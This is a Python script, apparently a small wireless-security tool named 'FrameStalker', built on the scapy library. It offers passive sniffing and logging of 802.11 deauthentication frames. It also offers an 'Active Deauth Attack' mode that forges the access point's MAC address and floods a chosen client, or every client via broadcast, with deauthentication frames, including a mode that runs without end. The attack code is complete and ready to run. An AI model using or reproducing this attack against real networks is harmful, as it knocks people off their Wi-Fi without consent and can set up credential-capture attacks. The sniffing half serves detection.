from scapy.all import *
from datetime import datetime
import time
import subprocess
import re

def is_valid_mac(mac: str) -> bool:
    """
    Validates a MAC address (uppercase or lowercase).
    Accepts formats like: aa:bb:cc:dd:ee:ff
    """
    return re.fullmatch(r'([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}', mac) is not None or mac.lower() == 'ff:ff:ff:ff:ff:ff'

def sniff_deauth(interface: str, log_callback=None, stop_filter=None, pcap_output: str = "deauth_capture.pcap", log_output: str = "deauth_report.txt") -> None:
    """
    Sniffs for 802.11 deauthentication frames and saves them to a pcap file.
    """
    captured_deauth_packets = []

    def process_packet(pkt):
        if pkt.haslayer(Dot11) and pkt.type == 0 and pkt.subtype == 12:
            captured_deauth_packets.append(pkt)
            src = pkt.addr2
            dst = pkt.addr1
            timestamp = datetime.now().strftime("%H:%M:%S")
            msg = f"[{timestamp}] Deauth ⚠️  From: {src} ➜ To: {dst}"
            if log_callback:
                log_callback(msg)
            else:
                print(msg)

    try:
        sniff(iface=interface, prn=process_packet, store=0, stop_filter=stop_filter)
    except KeyboardInterrupt:
        pass
    finally:
        if captured_deauth_packets:
            wrpcap(pcap_output, captured_deauth_packets)
            with open(log_output, "w") as f:
                f.write(f"Deauth capture log for interface {interface}:\n\n")
                for pkt in captured_deauth_packets:
                    timestamp = datetime.now().strftime("%H:%M:%S")
                    src = pkt.addr2
                    dst = pkt.addr1
                    f.write(f"[{timestamp}] Deauth From: {src} ➜ To: {dst}\n")
            print(f"[+] Saved {len(captured_deauth_packets)} packets to {pcap_output}")
            print(f"[+] Report saved to {log_output}")

def set_channel(interface: str, channel: int, log_callback=None):
    """
    Sets the Wi-Fi interface to the given channel using iwconfig.
    """
    try:
        subprocess.run(["iwconfig", interface, "channel", str(channel)], check=True)
        msg = f"[+] Interface {interface} set to channel {channel}"
    except subprocess.CalledProcessError:
        msg = f"[!] Failed to set channel {channel} on {interface}"
    if log_callback:
        log_callback(msg)
    else:
        print(msg)

def send_deauth(interface: str, ap_mac: str, target_mac: str, channel: int, count: int = 10, log_callback=None) -> None:
    """
    Sends deauthentication frames from the AP to the target STA.
    If count is 0, the attack runs indefinitely until interrupted.
    """
    if not is_valid_mac(ap_mac):
        msg = f"[!] Invalid AP MAC address: {ap_mac}"
        if log_callback:
            log_callback(msg)
        else:
            print(msg)
        return

    if not is_valid_mac(target_mac):
        msg = f"[!] Invalid target MAC address: {target_mac}"
        if log_callback:
            log_callback(msg)
        else:
            print(msg)
        return

    set_channel(interface, channel, log_callback)

    dot11 = Dot11(type=0, subtype=12, addr1=target_mac, addr2=ap_mac, addr3=ap_mac)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)

    start_msg = f"[+] Launching deauth attack from {ap_mac} ➜ {target_mac} on channel {channel}..."
    if log_callback:
        log_callback(start_msg)
    else:
        print(start_msg)

    if count == 0:
        cont_msg = "[!] Continuous mode enabled. Press the Stop button to terminate."
        if log_callback:
            log_callback(cont_msg)
        else:
            print(cont_msg)
        try:
            counter = 0
            last_log_time = time.time()
            while True:
                sendp(packet, iface=interface, count=1, inter=0.1, verbose=0)
                counter += 1
                if log_callback and time.time() - last_log_time >= 1:
                    timestamp = datetime.now().strftime("%H:%M:%S")
                    log_callback(f"[{timestamp}] Sending deauth packets... Total sent: {counter}")
                    last_log_time = time.time()

        except KeyboardInterrupt:
            done_msg = "[+] Attack stopped by user."
            if log_callback:
                log_callback(done_msg)
            else:
                print(done_msg)
    else:
        sendp(packet, iface=interface, count=count, inter=0.1, verbose=0)
        done_msg = f"[+] Attack complete. Total sent: {count}"
        if log_callback:
            log_callback(done_msg)
        else:
            print(done_msg)

# CLI Mode
if __name__ == "__main__":
    import sys

    print("=== FrameStalker Deauth Tool ===")
    print("1. Passive Deauth Frame Sniffing")
    print("2. Active Deauth Attack (Send packets)\n")

    choice = input("Choose mode [1/2]: ").strip()

    if choice == "1":
        iface = input("Enter monitor-mode interface (e.g. wlan0mon): ")
        sniff_deauth(iface)

    elif choice == "2":
        iface = input("Enter monitor-mode interface (e.g. wlan0mon): ")
        ap_mac = input("Enter AP MAC address: ").strip()
        target_mac = input("Enter Target MAC (or ff:ff:ff:ff:ff:ff to broadcast): ").strip()
        channel = int(input("Enter channel of the AP (e.g. 1, 6, 36): ").strip())
        count = input("How many deauth frames to send? Enter 0 for continuous: ").strip()
        count = int(count) if count.isdigit() else 10

        send_deauth(iface, ap_mac, target_mac, channel, count)

    else:
        print("Invalid choice.")

